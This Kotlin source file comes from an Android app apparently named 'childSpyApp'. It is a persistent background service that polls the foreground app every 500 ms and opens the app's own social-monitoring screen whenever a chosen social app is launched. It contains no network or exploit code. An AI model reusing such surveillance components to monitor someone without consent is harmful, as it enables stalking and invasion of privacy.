package sammy.mutahi.gicheru.childSpyApp.services.social

import android.content.Intent
import sammy.mutahi.gicheru.childSpyApp.services.base.BaseService
import sammy.mutahi.gicheru.childSpyApp.ui.social.SocialActivity
import sammy.mutahi.gicheru.childSpyApp.utils.ConstFun.getPackageCheckSocial
import sammy.mutahi.gicheru.childSpyApp.utils.checkForegroundApp.CheckApp
import sammy.mutahi.gicheru.childSpyApp.utils.checkForegroundApp.CheckPermission.hasUsageStatsPermission
import com.pawegio.kandroid.IntentFor
import com.pawegio.kandroid.start
import javax.inject.Inject


class MonitorService : BaseService() {

    private lateinit var appChecker: CheckApp

    @Inject
    lateinit var interactor: InteractorMonitorService

    override fun onCreate() {
        super.onCreate()
        getComponent()!!.inject(this)
        startAppChecker()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {

        if (!hasUsageStatsPermission()) interactor.setPermission(false)
        else interactor.setPermission(true)

        return START_STICKY
    }

    override fun onDestroy() {
        appChecker.stop()
        super.onDestroy()
        interactor.gerSocialStatus()
    }

    private fun startAppChecker() {
        appChecker = CheckApp(this) { app ->
            if (app == getPackageCheckSocial()) {
                startApp()
            }
        }.timeout(500).start()
    }

    private fun startApp() {
        val intent = IntentFor<SocialActivity>(this)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        intent.start(this)
    }

}